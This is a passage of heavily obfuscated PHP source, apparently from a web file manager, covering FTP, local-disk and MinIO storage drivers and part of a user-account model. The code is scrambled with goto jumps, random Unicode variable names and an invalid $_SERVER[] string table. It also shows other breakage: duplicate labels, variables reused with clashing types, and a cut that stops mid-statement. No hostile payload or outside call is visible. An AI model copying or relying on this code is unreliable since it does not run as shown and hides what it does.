2) == $F[1252]) { $Dٲ׳ = BASIC_PATH . substr($Dٲ׳, 2); } $D쾆 = KodIO::clear($D쾆); goto FŬ; dު: } private function _init($F = array()) { $A =& $_SERVER[]; if (!function_exists($A[1253])) { throw new Exception(LNG($A[1254])); } $this->config = $F; $this->charsetReset($F); foreach ($F as $cԍӎ => $Bي) { if (isset($this->{$cԍӎ})) { $this->{$cԍӎ} = $Bي; } } return $this->_login($F); } private function _login($E〉) { goto DԼ; Dʬ: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $eΊ = $this->pasv == $eֲ[87] ? !0 : !1; @ftp_pasv($this->connect, $eΊ); goto aǆσ; fН: $D = isset($dй˿[$eֲ[174]]) && $dй˿[$eֲ[174]] == $eֲ[1255] ? !0 : !1; $this->scheme = $D ? $eֲ[1256] : $eֲ[1257]; $this->port = isset($dй˿[$eֲ[176]]) ? $dй˿[$eֲ[176]] : 21; goto f; f: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $D = @ftp_login($this->connect, $this->username, $this->userpass); goto Dʬ; AΞѣ: if (isset($B[$fĄˇ])) { foreach ($B[$fĄˇ] as $aʳ => $e踰) { $this->{$aʳ} = $e踰; } return !0; } $dй˿ = parse_url(trim($this->server, $eֲ[8])); $this->host = $dй˿[$eֲ[175]]; goto fН; DԼ: $eֲ =& $_SERVER[]; static $B = array(); $fĄˇ = md5(json_encode($E〉)); goto AΞѣ; aǆσ: $B[$fĄˇ] = array($eֲ[1258] => $this->connect, $eֲ[175] => $this->host, $eֲ[174] => $this->scheme, $eֲ[176] => $this->port); return $D; goto E᷃; E᷃: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($E, $f = '', $fڣ = REPEAT_RENAME) { if ($this->setContent($E, $f)) { return $this->getPathOuter($E); } return !1; } public function mkdir($D֪ߟ, $c = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $D֪ߟ = $this->iconvSystem($D֪ߟ); if ($this->_isFolder($D֪ߟ) || @ftp_mkdir($this->connect, $D֪ߟ)) { return $this->getPathOuter($D֪ߟ); } if (!$this->mkdir($this->pathFather($D֪ߟ))) { return !1; } if ($D֪ߟ = @ftp_mkdir($this->connect, $D֪ߟ)) { return $this->getPathOuter($D֪ߟ); } return !1; } public function copyFile($a龳, $a) { goto aՑ; aՑ: if (!$this->_isconn()) { return !1; } $EՂɵ = $this->pathThis($this->iconvSystem($a龳)); $F↦ = $this->tempFile($EՂɵ); goto FƲ; E泯: $this->tempFileRemve($F↦); return $eäߊ; goto Fتۋ; FƲ: $E֌ = $this->iconvApp($F↦); $this->download($a龳, $E֌); $eäߊ = $this->upload($a, $E֌); goto E泯; Fتۋ: } public function moveFile($FŊ, $Bإ) { if (!$this->_isconn()) { return !1; } $FŊ = $this->iconvSystem($FŊ); $Bإ = $this->iconvSystem($Bإ); $cƲ = @ftp_rename($this->connect, $FŊ, $Bإ); return $cƲ ? $this->getPathOuter($Bإ) : !1; } public function delFile($dީ) { if (!$this->_isconn()) { return !1; } $dީ = $this->iconvSystem($dީ); return @ftp_delete($this->connect, $dީ); } public function delFolder($a) { goto d; A􇹽: foreach ($EŘ as $A) { $A = $this->iconvSystem($A); $B򼫵 = @ftp_rmdir($this->connect, $A); if (!$B򼫵) { return !1; } } $a = $this->iconvSystem($a); return @ftp_rmdir($this->connect, $a); goto b悠; d: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $EŘ = $Cϭċ = array(); goto Fߺ; Fߺ: $this->fileList($a, $EŘ, $Cϭċ, !0); $this->listItemCache = !0; foreach ($Cϭċ as $d٩) { $A = $this->iconvSystem($d٩[$_SERVER[][28]]); $B򼫵 = @ftp_delete($this->connect, $A); if (!$B򼫵) { return !1; } } goto A􇹽; b悠: } public function rename($c, $E) { goto EÄ͠; EÄ͠: $Eݍ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $Fѧ = $this->fileNameAuto($this->pathFather($c), $E); goto A; b玘: $F = rtrim($b, $Eݍ[8]) . $Eݍ[8] . $Fѧ; $b = @ftp_rename($this->connect, $c, $F); $F = $this->iconvApp($F); goto f󉟇; f󉟇: return $b ? $this->getPathOuter($F) : !1; goto eŦ; A: $Fѧ = $this->iconvSystem($Fѧ); $c = $this->iconvSystem($c); $b = $this->pathFather($c); goto b玘; eŦ: } private function folderInfo($Bߐ, $dꓣ = false) { $aƺم =& $_SERVER[]; $E = array($aƺم[28] => $this->pathThis($Bߐ), $aƺم[76] => $this->getPathOuter($aƺم[8] . $Bߐ), $aƺم[29] => $aƺم[77]); if ($dꓣ) { return $E; } $E[$aƺم[194]] = $E[$aƺم[84]] = 0; $E[$aƺم[195]] = $E[$aƺم[196]] = !0; return $E; } private function fileInfo($cи㹲, $FڸŊ = false, $A۷ = array()) { goto fƙ; E: $bϡ[$Dέ[84]] = @ftp_mdtm($this->connect, $f¹ҋ); if (empty($A۷)) { $A۷ = $this->objectMeta($cи㹲); if (!$A۷) { return $bϡ; } } $bϡ[$Dέ[78]] = $A۷[$Dέ[78]]; goto CĚȲ; fƙ: $Dέ =& $_SERVER[]; $bϡ = array($Dέ[28] => $this->pathThis($cи㹲), $Dέ[76] => $this->getPathOuter($Dέ[8] . $cи㹲), $Dέ[29] => $Dέ[193], $Dέ[78] => isset($A۷[$Dέ[78]]) ? $A۷[$Dέ[78]] : 0, $Dέ[168] => $this->ext($cи㹲)); if ($FڸŊ) { return $bϡ; } goto f; f: $bϡ[$Dέ[194]] = $bϡ[$Dέ[84]] = 0; $bϡ[$Dέ[195]] = $bϡ[$Dέ[196]] = !0; $f¹ҋ = $this->iconvSystem($cи㹲); goto E; CĚȲ: return $bϡ; goto Dث; Dث: } public function size($a) { $D˺ = $this->objectMeta($a); return $D˺ ? $D˺[$_SERVER[][78]] : 0; } public function info($BÖ) { if ($this->isFile($BÖ)) { return $this->fileInfo($BÖ, 0); } else { if ($this->isFolder($BÖ)) { return $this->folderInfo($BÖ); } } return !1; } private function fileList($DЦ, &$fԈ, &$a؉, $FƂ劈 = false) { goto a↑; a↑: $cÖߌ =& $_SERVER[]; $DЦ = $this->iconvSystem($DЦ); if (!$this->isFolder($DЦ)) { return !1; } goto bĴ; F: $Fߊ = $this->listItemCache === !1 ? !1 : !0; $F֬ݎ = @ftp_rawlist($this->connect, $DЦ); if (!$F֬ݎ) { $F֬ݎ = array(); } goto Dִ߬; Dִ߬: $EЩÉ = array($cÖߌ[95] => 1, $cÖߌ[1259] => 1); foreach ($F֬ݎ as $cț) { goto AݑΑ; bϮ: if (empty($Ç) && $Ç !== $cÖߌ[191] || isset($EЩÉ[$Ç])) { continue; } $Ç = $this->iconvApp($DЦ . ltrim($Ç, $cÖߌ[8])); $dܹ = array($cÖߌ[28] => $Ç, $cÖߌ[29] => $cÖߌ[193], $cÖߌ[78] => $Cݘ[4]); goto A; AݑΑ: $Cݘ = $this->_listItem($cț); if ($Cݘ[0] == $cÖߌ[725]) { continue; } $Ç = $Cݘ[8]; goto bϮ; A: if (substr($cț, 0, 1) == $cÖߌ[1260]) { $dܹ[$cÖߌ[29]] = $cÖߌ[77]; $dܹ[$cÖߌ[78]] = 0; } $d㐝 = $dܹ[$cÖߌ[29]] == $cÖߌ[77] ? !0 : !1; if ($Fߊ) { $this->cacheMethod($cÖߌ[199], $Ç, $d㐝); $this->cacheMethod($cÖߌ[200], $Ç, $dܹ); } goto E̺; E̺: if ($d㐝) { $fԈ[] = $Ç; if ($FƂ劈) { $this->fileList($Ç, $fԈ, $a؉, $FƂ劈); } continue; } $a؉[] = $dܹ; goto Aߍ; Aߍ: } if ($Fߊ) { $this->cacheMethod($cÖߌ[199], $DЦ, !0); } goto C͋԰; bĴ: @ftp_chdir($this->connect, $cÖߌ[8]); $DЦ = rtrim($DЦ, $cÖߌ[8]) . $cÖߌ[8]; check_abort(); goto F; C͋԰: } private function _listItem($F񙫃) { if (empty($F񙫃)) { return array(); } $Aξ = preg_split($_SERVER[][1261], $F񙫃); if (count($Aξ) <= 9) { return $Aξ; } $Aξ[8] = trim(substr($F񙫃, strpos($F񙫃, $Aξ[7]) + strlen($Aξ[7]))); return array_splice($Aξ, 0, 9); } public function listPath($C򺦫, $e = false) { goto A킑; Cŗ: return array($FǑӸ[75] => $fЭ벞, $FǑӸ[74] => $Cλ); goto e; A킑: $FǑӸ =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $fЭ벞 = $Cλ = array(); goto e໛; e໛: $this->fileList($C򺦫, $fЭ벞, $Cλ); foreach ($fЭ벞 as $b׿Ç => $E) { $fЭ벞[$b׿Ç] = $this->folderInfo($E, $e); } foreach ($Cλ as $b׿Ç => $E) { $Cλ[$b׿Ç] = $this->fileInfo($E[$FǑӸ[28]], $e, $E); } goto Cŗ; e: } public function has($Bǔȳ, $bՒ = false, $dºˍ = true) { goto cꊋ; d: return !1; goto B̎; cꊋ: $fѩ =& $_SERVER[]; $E쪸 = $E؋ = array(); $b = $bՒ ? !0 : !1; goto a; a: $this->fileList($Bǔȳ, $E쪸, $E؋, $b); if ($bՒ) { return array($fѩ[203] => count($E؋), $fѩ[204] => count($E쪸)); } if ($dºˍ) { if (count($E؋)) { return !0; } } else { if (count($E쪸)) { return !0; } } goto d; B̎: } public function listAll($A) { goto fԠַɾ; F̆Ծ݊: $this->fileList($A, $eܕΪȮ, $Aر, !0); $B՚߯ = array(); foreach ($Aر as $Eٜ쌋) { $B՚߯[$Eٜ쌋[$c[28]]] = $Eٜ쌋[$c[78]]; } goto B̯; B̯: foreach ($eܕΪȮ as $Eٜ쌋) { if (is_string($Eٜ쌋)) { $B՚߯[$Eٜ쌋] = 0; } } return $this->listAllFiles($A, array_keys($B՚߯), $B՚߯); goto C䆘; fԠַɾ: $c =& $_SERVER[]; if (!$this->_isconn()) { return !1; } $eܕΪȮ = $Aر = array(); goto F̆Ծ݊; C䆘: } public function getContent($eʚ) { if (!$this->_isconn()) { return !1; } $eʚ = $this->iconvSystem($eʚ); return $this->fileSubstr($eʚ); } public function setContent($F辎, $Eӕ = '') { goto dȈ; FҸ: file_put_contents($fʽ, $Eӕ); $d = $this->upload($F辎, $this->iconvApp($fʽ)); $this->tempFileRemve($fʽ); goto B쇝; B쇝: return $d; goto D; dȈ: if (!$this->_isconn()) { return !1; } $Cߪ = $this->pathThis($this->iconvSystem($F辎)); $fʽ = $this->tempFile($Cߪ); goto FҸ; D: } public function fileSubstr($b¼, $Bޥ = 0, $E⇽ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($b¼, $Bޥ, $E⇽); } private function ftpRequest($Aѧ, $Bꑓꤎ = 0, $Bㅿ = false) { goto B͐; f: curl_setopt($c޾, CURLOPT_RETURNTRANSFER, 1); $cĴҶ = curl_exec($c޾); curl_close($c޾); goto dȩ۪; B͐: $Aѧ = $this->iconvSystem($Aѧ); $cЂ = $this->scheme . $this->host . $_SERVER[][4] . $this->port; $c޾ = curl_init(); goto f; f: curl_setopt($c޾, CURLOPT_URL, $cЂ . $this->pathEncode($Aѧ)); curl_setopt($c޾, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($Bㅿ) { $C؊拰 = $Bꑓꤎ + $Bㅿ - 1; curl_setopt($c޾, CURLOPT_RANGE, "{$Bꑓꤎ}\55{$C؊拰}"); } goto f; dȩ۪: return $cĴҶ; goto fɾϦ; fɾϦ: } public function upload($dϘ, $BȊ, $fᤏ = false, $aΖ = REPEAT_REPLACE) { goto F͸ߚ; e: if ($dӐ != FTP_FINISHED) { return !1; } return $this->getPathOuter($dϘ); goto e⽄; CÍϑ: $BȊ = $this->iconvSystem($BȊ); $dӐ = ftp_nb_put($this->connect, $dϘ, $BȊ, FTP_BINARY); while ($dӐ == FTP_MOREDATA) { $dӐ = ftp_nb_continue($this->connect); } goto e; F͸ߚ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($dϘ))) { return !1; } $dϘ = $this->iconvSystem($dϘ); goto CÍϑ; e⽄: } public function download($d؟Ѓ, $cۺӏ = '') { goto D̯; D̯: if (!$this->_isconn()) { return !1; } $d = $this->pathFather($cۺӏ); if (!IO::mkdir($d)) { return !1; } goto A; A: $d؟Ѓ = $this->iconvSystem($d؟Ѓ); $cۺӏ = $this->iconvSystem($cۺӏ); $DӍ = ftp_nb_get($this->connect, $cۺӏ, $d؟Ѓ, FTP_BINARY); goto C; C: while ($DӍ == FTP_MOREDATA) { $DӍ = ftp_nb_continue($this->connect); } if ($DӍ != FTP_FINISHED) { return !1; } return $this->iconvApp($cۺӏ); goto A̰; A̰: } public function exist($c) { return $this->isFile($c) || $this->isFolder($c); } public function isFile($cȉ) { return !$this->isFolder($cȉ) && $this->objectMeta($cȉ); } public function isFolder($F튬) { return $this->cacheMethod($_SERVER[][199], $F튬); } protected function objectMeta($C֙) { return $this->cacheMethod($_SERVER[][200], $C֙); } protected function _objectMeta($bЃ) { goto f; d兰: $bЃ = $this->iconvSystem($bЃ); $eё = array($Eɕ߭[28] => $this->iconvApp($bЃ), $Eɕ߭[29] => $Eɕ߭[193], $Eɕ߭[78] => 0); @ftp_chdir($this->connect, $Eɕ߭[8]); goto DÛ; DÛ: $dѣ = @ftp_size($this->connect, $bЃ); if ($dѣ != -1) { $eё[$Eɕ߭[78]] = $dѣ; } else { $e = @ftp_chdir($this->connect, $bЃ); if (!$e) { return !1; } $eё[$Eɕ߭[29]] = $Eɕ߭[77]; } return $eё; goto E; f: $Eɕ߭ =& $_SERVER[]; if ($bЃ == $Eɕ߭[33] || $bЃ == $Eɕ߭[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto d兰; E: } protected function _isFolder($a병) { $a䆂 =& $_SERVER[]; if ($a병 == $a䆂[33] || $a병 == $a䆂[8]) { return !0; } $E = $this->_objectMeta($a병); return isset($E[$a䆂[29]]) && $E[$a䆂[29]] == $a䆂[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($C꣤⢲) { if (substr($C꣤⢲, 0, 2) == $_SERVER[][1252]) { $C꣤⢲ = BASIC_PATH . substr($C꣤⢲, 2); } return $C꣤⢲; } public function iconvApp($eه) { $b =& $_SERVER[]; global $config; return $this->iconvTo($eه, $config[$b[1250]], $config[$b[1249]]); } public function iconvSystem($d賐) { $aؽ =& $_SERVER[]; global $config; return $this->iconvTo($d賐, $config[$aؽ[1249]], $config[$aؽ[1250]]); } public function getPathOuter($Dь) { goto B뚈ѥ; eߍ: if (substr($EǬ, 0, 2) == $bș¿я[1252]) { $EǬ = BASIC_PATH . substr($EǬ, 2); } if (substr($Dь, 0, 2) == $bș¿я[1252]) { $Dь = BASIC_PATH . substr($Dь, 2); } $EǬ = KodIO::clear($EǬ); goto dԼ; B뚈ѥ: $bș¿я =& $_SERVER[]; $EǬ = $this->iconvApp($this->pathBase); $Dь = $this->iconvApp($Dь); goto eߍ; a: return $this->pathDriver . $bș¿я[8] . ltrim($Dь, $bș¿я[8]); goto Eъ; dԼ: $Dь = KodIO::clear($Dь); $Dь = substr($Dь, strlen($EǬ)); if (empty($this->pathDriver)) { return $Dь; } goto a; Eъ: } public function mkfile($E, $a㏣ = '', $b = REPEAT_RENAME) { $E = $this->iconvSystem($E); @touch($E); if ($a㏣) { file_put_contents($E, $a㏣); } @chmod($E, 511); return is_file($E) ? $this->getPathOuter($E) : !1; } public function mkdir($B̢, $EՅэ = REPEAT_SKIP) { $B̢ = $this->iconvSystem($B̢); if (is_dir($B̢)) { return $this->getPathOuter($B̢); } @mkdir($B̢, 511, !0); @chmod($B̢, 511); return is_dir($B̢) ? $this->getPathOuter($B̢) : !1; } public function copyFile($dВ, $Cۮ) { $this->mkdir($this->pathFather($Cۮ)); $dВ = $this->iconvSystem($dВ); $Cۮ = $this->iconvSystem($Cۮ); $F҂ = copy_64($dВ, $Cۮ); @chmod($Cۮ, 511); return $F҂ ? $this->getPathOuter($Cۮ) : !1; } public function moveFile($c, $A) { goto eֲ; f: $F΢ʚ = intval(@rename($c, $A)); if (!$F΢ʚ) { if ($F΢ʚ = intval(@copy_64($c, $A))) { @unlink($c); } } @chmod($A, 511); goto Dʎ; Dʎ: return $F΢ʚ ? $this->getPathOuter($A) : !1; goto f߄; eֲ: $this->mkdir($this->pathFather($A)); $c = $this->iconvSystem($c); $A = $this->iconvSystem($A); goto f; f߄: } public function delFile($bȿÌ) { $bȿÌ = $this->iconvSystem($bȿÌ); if (!@unlink($bȿÌ)) { @chmod($bȿÌ, 511); if (!@unlink($bȿÌ)) { return !1; } } else { return !0; } } public function delFolder($f) { goto EŐ; a: return rmdir($f); goto cѺ; EŐ: $c͒ =& $_SERVER[]; $f = $this->iconvSystem($f); if (!is_dir($f)) { return !0; } goto Cɵ; Cɵ: if (!($C޸ = opendir($f))) { return !1; } while (($fʹ = readdir($C޸)) !== !1) { if ($fʹ == $c͒[95] || $fʹ == $c͒[1259]) { continue; } $Aڒܵ = $f . $c͒[8] . $fʹ; if (is_file($Aڒܵ) || is_link($Aڒܵ)) { if (!unlink($Aڒܵ)) { chmod($Aڒܵ, 511); if (!unlink($Aڒܵ)) { return !1; } } } else { if (is_dir($Aڒܵ)) { chmod($Aڒܵ, 511); $Aڒܵ = $this->iconvApp($Aڒܵ); if (!$this->delFolder($Aڒܵ)) { return !1; } } } } closedir($C޸); goto a; cѺ: } public function rename($a֮ݻ, $a˾) { goto f䦵; f䦵: $B =& $_SERVER[]; $e܈ = $this->fileNameAuto($this->pathFather($a֮ݻ), $a˾); $e܈ = $this->iconvSystem($e܈); goto Eхǽ; c٢쫃: $Dꄶ = @rename($a֮ݻ, $cѿ); $cѿ = $this->iconvApp($cѿ); return $Dꄶ ? $this->getPathOuter($cѿ) : !1; goto fߋ; Eхǽ: $a֮ݻ = $this->iconvSystem($a֮ݻ); $D䥏 = $this->pathFather($a֮ݻ); $cѿ = rtrim($D䥏, $B[8]) . $B[8] . $e܈; goto c٢쫃; fߋ: } public function size($aʔů) { $aʔů = $this->iconvSystem($aʔů); return filesize_64($aʔů); } public function info($c) { $c = $this->iconvSystem($c); if ($this->isFolder($c)) { return $this->folderInfo($c); } else { if ($this->isFile($c)) { return $this->fileInfo($c); } } return !1; } protected function infoChildren($C倫ȇ, &$B겊, $a챈 = true) { goto D; eڃ: closedir($A֏훐); goto B; D: $C͢ =& $_SERVER[]; check_abort_echo(); $C倫ȇ = rtrim($C倫ȇ, $C͢[8]) . $C͢[8]; goto Bԙ; Bԙ: if ($a챈) { $C倫ȇ = $this->iconvSystem($C倫ȇ); } if (!($A֏훐 = @opendir($C倫ȇ))) { return; } while (($e҃ = readdir($A֏훐)) !== !1) { if ($e҃ == $C͢[95] || $e҃ == $C͢[1259]) { continue; } $bȶ = $C倫ȇ . $e҃; if (is_file($bȶ) || is_link($bȶ)) { $B겊[$C͢[79]]++; $B겊[$C͢[78]] += filesize_64($bȶ); } else { if (is_dir($bȶ)) { $B겊[$C͢[80]]++; $this->infoChildren($bȶ, $B겊, !1); } } } goto eڃ; B: } private function folderInfo($dŇ, $eͺ = false) { $d볇 =& $_SERVER[]; $dŇ = rtrim($dŇ, $d볇[8]) . $d볇[8]; $b殾 = $this->iconvApp($this->pathThis($dŇ)); if ($eͺ) { return array($d볇[28] => $b殾, $d볇[76] => $this->getPathOuter($dŇ), $d볇[29] => $d볇[77]); } $e = array($d볇[28] => $b殾, $d볇[76] => $this->getPathOuter($dŇ), $d볇[29] => $d볇[77], $d볇[194] => @filectime($dŇ), $d볇[84] => @filemtime($dŇ), $d볇[1262] => @fileatime($dŇ), $d볇[1263] => is_readable($dŇ), $d볇[1264] => is_writable($dŇ), $d볇[1265] => get_mode($dŇ)); return $e; } private function fileInfo($f, $Bɫ = false) { $eƗ =& $_SERVER[]; $E軎 = $this->iconvApp($this->pathThis($f)); if ($Bɫ) { return array($eƗ[28] => $E軎, $eƗ[76] => $this->getPathOuter($f), $eƗ[29] => $eƗ[193], $eƗ[78] => $this->size($f), $eƗ[168] => $this->ext($E軎)); } $b쇲 = array($eƗ[28] => $E軎, $eƗ[76] => $this->getPathOuter($f), $eƗ[29] => $eƗ[193], $eƗ[194] => @filectime($f), $eƗ[84] => @filemtime($f), $eƗ[1262] => @fileatime($f), $eƗ[78] => $this->size($f), $eƗ[168] => $this->ext($E軎), $eƗ[1263] => is_readable($f), $eƗ[1264] => is_writable($f), $eƗ[1265] => get_mode($f)); return $b쇲; } public function exist($BՄ) { $BՄ = $this->iconvSystem($BՄ); return @file_exists($BՄ); } public function isFile($F֍) { $F֍ = $this->iconvSystem($F֍); return @is_file($F֍); } public function isFolder($FƧ) { $FƧ = $this->iconvSystem($FƧ); return @is_dir($FƧ); } public function listPath($B, $E͕ = false) { goto DÙ; a: closedir($f֩); return $D; goto A࿉; DÙ: $f̈́ =& $_SERVER[]; $B = $this->iconvSystem($B); $B = rtrim($B, $f̈́[8]) . $f̈́[8]; goto d; d: $D = array($f̈́[75] => array(), $f̈́[74] => array()); if (!($f֩ = @opendir($B))) { return $D; } while (($c = readdir($f֩)) !== !1) { if ($c == $f̈́[95] || $c == $f̈́[1259]) { continue; } $Cˍ = $B . $c; if (is_file($Cˍ)) { $D[$f̈́[74]][] = $this->fileInfo($Cˍ, $E͕); } else { $D[$f̈́[75]][] = $this->folderInfo($Cˍ, $E͕); } } goto a; A࿉: } public function listAll($f쮦, &$C = array()) { goto Aї; b: if (!($d = @opendir($f쮦))) { return $C; } while (($Eٍ = readdir($d)) !== !1) { if ($Eٍ == $a[95] || $Eٍ == $a[1259]) { continue; } $C = $f쮦 . $Eٍ; if (is_dir($C) && !is_link($C)) { $C[] = array($a[76] => $C . $a[8], $a[77] => 1, $a[84] => @filemtime($C), $a[78] => 0); $this->listAll($C, $C); } else { $C[] = array($a[76] => $C, $a[77] => 0, $a[84] => @filemtime($C), $a[78] => $this->size($C)); } } closedir($d); goto F; F: return $C; goto dٷ; Aї: $a =& $_SERVER[]; $f쮦 = $this->iconvSystem($f쮦); $f쮦 = rtrim($f쮦, $a[8]) . $a[8]; goto b; dٷ: } public function has($BԎ, $B맑 = false, $a = true) { goto D̜; D̜: $b =& $_SERVER[]; $BԎ = $this->iconvSystem($BԎ); $BԎ = rtrim($BԎ, $b[8]) . $b[8]; goto F; c: $b = 0; while (($b = readdir($AҊ)) !== !1) { if ($b == $b[95] || $b == $b[1259]) { continue; } $CՓ = $BԎ . $b; if ($B맑) { $b++; if (@is_file($CՓ)) { $c++; } else { $F҃խ++; } if ($b > 10000) { break; } continue; } if ($a) { if (@is_file($CՓ)) { return !0; } } else { if (@is_dir($CՓ . $b[8])) { return !0; } } } closedir($AҊ); goto A; A: if ($B맑) { return array($b[203] => $c, $b[204] => $F҃խ); } return !1; goto a˻; F: if (!($AҊ = @opendir($BԎ))) { return !1; } $c = 0; $F҃խ = 0; goto c; a˻: } public function hashSimple($c샒) { goto aԮر; d؛޺: if ($Aݞ <= $B߄ * $D砉) { return $this->hashMd5($c샒) . $Aݞ; } $fĖ = $aǘ־[33]; $D܂ = intval($Aݞ / $D砉); goto EԨ; fӌ: return md5($fĖ) . $Aݞ; goto e߰; aԮر: $aǘ־ =& $_SERVER[]; if (!$c샒) { return md5($aǘ־[33]); } $c샒 = $this->iconvSystem($c샒); goto Cى; EԨ: $A = fopen($c샒, $aǘ־[1266]); if (!$A) { return $fĖ; } for ($eՊ = 0; $eՊ < $D砉; $eՊ++) { fseek_64($A, $D܂ * $eՊ); $fĖ .= fread($A, $B߄); } goto d; d: fseek_64($A, $Aݞ - $B߄); $fĖ .= fread($A, $B߄); fclose($A); goto fӌ; Cى: $Aݞ = $this->size($c샒); $B߄ = 200; $D砉 = 50; goto d؛޺; e߰: } public function getContent($E) { $E = $this->iconvSystem($E); return file_get_contents($E); } public function setContent($FɈ, $C쥪 = '') { $FɈ = $this->iconvSystem($FɈ); $EĠ = @file_put_contents($FɈ, $C쥪, LOCK_EX); clearstatcache(); @chmod($FɈ, 511); return $EĠ === !1 ? !1 : !0; } public function fileSubstr($Cɳ, $b͈ = 0, $cϧ = false) { goto B嗟ĝ; B嗟ĝ: $e鎍 =& $_SERVER[]; $Cɳ = $this->iconvSystem($Cɳ); if ($cϧ === !1) { $cϧ = $this->size($Cɳ); } goto b; d: fseek_64($d, $b͈); $C = fread($d, $cϧ); fclose($d); goto dΪũ؅; dΪũ؅: return $C; goto ĉˊ; b: if ($cϧ <= 0) { return $e鎍[33]; } $d = fopen($Cɳ, $e鎍[1266]); if (!$d) { return !1; } goto d; ĉˊ: } public function upload($B, $D֐, $E = false, $cߌю = REPEAT_REPLACE) { if ($E) { return $this->moveFile($D֐, $B); } return $this->copyFile($D֐, $B); } public function setModifyTime($b٥, $bͮ = '') { @touch($b٥, intval($bͮ)); } public function download($D󎮱, $A) { return $this->iconvSystem($D󎮱); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fخ) { parent::__construct($fخ); $this->signatureVersion($_SERVER[][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto b»; b؋: class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\155\x65" => "\165\163\145\162\137\x6d\145\164\141", "\x6d\x65\164\141\x46\151\145\154\x64" => "\165\x73\x65\x72\x49\104"); protected $simpleField = "\x75\x73\145\x72\111\x44\54\156\151\143\x6b\116\x61\155\145\54\x6e\x61\x6d\145\54\141\166\141\164\x61\162\x2c\163\x65\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Aӊ៎) { $aʅ =& $_SERVER[]; $eó = $aʅ[2125]; return array($aʅ[1771] => array($Aӊ៎[0], $eó), $aʅ[1773] => array($Aӊ៎[0], $eó), $aʅ[2126] => array($Aӊ៎[0], $eó)); } protected function getInfo($D؟, $aӲ = false) { $E⏔ = $this->getInfoSimple($D؟); if (!is_array($E⏔)) { return array(); } if ($aӲ) { return $this->_getInfoApply($E⏔); } return $this->cacheFunctionGet($_SERVER[][1780], $D؟); } protected function getInfoFull($dÄ⑉, $fø = false) { $Aؕԕ = $this->getInfoSimple($dÄ⑉); if (!is_array($Aؕԕ)) { return array(); } if ($fø) { return $this->_getInfoApply($Aؕԕ, !0); return $this->_getInfoApply($Aؕԕ, !0); } return $this->cacheFunctionGet($_SERVER[][2127], $dÄ⑉); } private function _getInfoApply($e싟둣, $eϮÌӈ = false) { goto dȃ; d: $e싟둣[$EɃâ[85]][$EɃâ[1961]] = isset($A[$EɃâ[1962]]) ? $A[$EɃâ[1962]] : null; if ($eϮÌӈ) { $e싟둣[$EɃâ[445]] = $this->metaGet($e싟둣[$EɃâ[1533]]); } return $e싟둣; goto dޒ҅; dȃ: $EɃâ =& $_SERVER[]; if (!$e싟둣) { return $e싟둣; } $Fݹ = md5($EɃâ[2128] . $e싟둣[$EɃâ[856]] . $EɃâ[2129] . $e싟둣[$EɃâ[28]]); goto f񅝘; f񅝘: $e싟둣 = $this->_listDataApplyItem($e싟둣); $A = Model($EɃâ[1213])->metaGet($e싟둣[$EɃâ[85]][$EɃâ[395]]); $e싟둣[$EɃâ[2130]] = $Fݹ; goto d; dޒ҅: } protected function getInfoSimple($Dӕ, $C = false) { $eǎ֏ =& $_SERVER[]; if (!$Dӕ) { return array(); } if ($C) { $Dȯ = $this->where(array($eǎ֏[1533] => intval($Dӕ)))->find(); if (!is_array($Dȯ)) { return array(); } $Dȯ[$eǎ֏[2131]] = Action($eǎ֏[2132])->parseUrl($Dȯ[$eǎ֏[2131]]); return $Dȯ; } return $this->cacheFunctionGet($eǎ֏[1774], $Dӕ); } protected function getInfoSimpleOuter($dޣ) { goto F̜֙; bΨ: return $aⴥ; goto a̬; DЊ: $aⴥ = array_field_key($B, explode($Cټ[47], $this->simpleField)); if (!$aⴥ) { return array($Cټ[1533] => $Cټ[1092], $Cټ[28] => $Cټ[160] . LNG($Cټ[2135]) . $Cټ[504], $Cټ[2131] => STATIC_PATH . $Cټ[2136]); } $aⴥ[$Cټ[2131]] = Action($Cټ[2132])->parseUrl($aⴥ[$Cټ[2131]]); goto bΨ; F̜֙: $Cټ =& $_SERVER[]; if (!$dޣ || $dޣ == 0) { return array($Cټ[1533] => $Cټ[191], $Cټ[28] => $Cټ[160] . LNG($Cټ[2133]) . $Cټ[504], $Cټ[2131] => STATIC_PATH . $Cټ[2134]); } $B = $this->cacheFunctionGet($Cټ[1774], $dޣ); goto DЊ; a̬: } protected function groupUser($dì) { } public static function errorLang($EҎ) { $dഒ =& $_SERVER[]; $A = array(self::ERROR_USER_NOT_EXISTS => $dഒ[2137], self::ERROR_USER_PASSWORD_ERROR => $dഒ[2138], self::ERROR_USER_EXIST_NAME => $dഒ[2139], self::ERROR_USER_EXIST_PHONE => $dഒ[2140], self::ERROR_USER_EXIST_EMAIL => $dഒ[2141], self::ERROR_USER_LOGIN_LOCK => $dഒ[2142], self::ERROR_IP_NOT_ALLOW => $dഒ[2143], self::ERROR_USER_EXIST_NICKNAME => $dഒ[2144]); return LNG($A[$EҎ]); } public function getInfoByMeta($f, $Eן) { $EИ椭 =& $_SERVER[]; $dة = Model($EИ椭[2145])->where(array($EИ椭[93] => $f, $EИ椭[372] => $Eן))->find(); if ($dة) { return $this->getInfo($dة[$EИ椭[1533]]); } return !1; } public function userLoginCheck($bʣ, $c) { $F =& 